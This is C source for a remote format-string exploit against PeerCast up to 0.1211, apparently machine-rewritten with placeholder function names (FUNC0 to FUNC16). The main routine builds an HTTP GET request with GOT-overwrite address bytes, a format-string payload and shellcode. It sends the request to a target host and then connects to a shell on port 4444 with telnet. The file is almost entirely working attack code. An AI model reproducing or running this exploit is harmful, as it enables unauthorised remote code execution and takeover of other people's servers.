#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  endian ;
typedef  int /*<<< orphan*/  addr ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 unsigned long GOTADDR ; 
 char* HOST ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  PORT ; 
 unsigned long SHELLADDR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 scalar_t__ FUNC0 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC1 (unsigned char,unsigned char,unsigned char,unsigned char,unsigned long) ; 
 char* FUNC2 (unsigned long,unsigned int,unsigned int,int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int /*<<< orphan*/  FUNC10 (char*,int,char*,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char,unsigned char) ; 
 int FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*) ; 
 int FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (char*) ; 

int
FUNC16( int argc, char * argv[] )
{
  struct sockaddr_in addr;
  int sock;
  char * fmt;
  char endian[31337], da_shell[31337];
  unsigned long locaddr, retaddr;
  unsigned int offset, base;
  unsigned char b0, b1, b2, b3;

  FUNC15("clear");
  FUNC7("*^*^*^ PeerCast <= 0.1211 remote format string exploit ^*^*^*\n");
  FUNC7("*^*^*^                    by Darkeagle                 ^*^*^*\n");
  FUNC7("*^*^*^      uKt researcherz [ http://unl0ck.org ]      ^*^*^*\n\n");   

  FUNC6( endian, 0x00, 31337 );
  FUNC6( da_shell, 0x00, 31337 );

  addr.sin_family = AF_INET;
  addr.sin_port = FUNC4(PORT);
  addr.sin_addr.s_addr = FUNC5(HOST);

  sock = FUNC11(AF_INET, SOCK_STREAM, IPPROTO_IP);

  locaddr = GOTADDR;
  retaddr = SHELLADDR;
  offset  = 1265; // GET /html/en/index.htmlAAA%1265$x and you will get AAAA41414141

  FUNC1( b0, b1, b2, b3, locaddr );

  base = 4;
  FUNC7("[*] Buildin' evil code\n");
  FUNC13(endian, "GET /html/en/index.html");
  FUNC10( endian+FUNC14(endian), sizeof(endian),
            "%c%c%c%c"
            "%c%c%c%c"
            "%c%c%c%c"
            "%c%c%c%c",
             b3, b2, b1, b0,
             b3 + 1, b2, b1, b0,
             b3 + 2, b2, b1, b0,
             b3 + 3, b2, b1, b0 );

 fmt = FUNC2( retaddr, offset, base, 0x10 );

 FUNC6(fmt+FUNC14(fmt), 0x55, 32);
 FUNC13(fmt, shellcode);
 FUNC13(endian, fmt);
 FUNC13(endian, "\r\n\r\n\r\n");
 FUNC7("[+] Buildin' complete!\n");
 FUNC12(da_shell, "telnet %s 4444", HOST);

 // just go, y0!
 FUNC7("[*] Connectin'\n");
 if ( FUNC0(sock, (struct sockaddr*)&addr, sizeof(addr)) ) { FUNC7("[-] Connection failed!\n\n"); FUNC3(0); }

 FUNC7("[+] Connected!\n");
 FUNC7("[*] Sleepin'\n");
 FUNC9(1);

 FUNC7("[*] Sendin'\n");
 FUNC8(sock, endian, FUNC14(endian), 0);

 FUNC7("[*] Sleepin'\n");
 FUNC9(1);
 	
 FUNC7("[*] Connectin' in da shell\n\n");
 FUNC9(1);
 FUNC15(da_shell);
 return 0;
}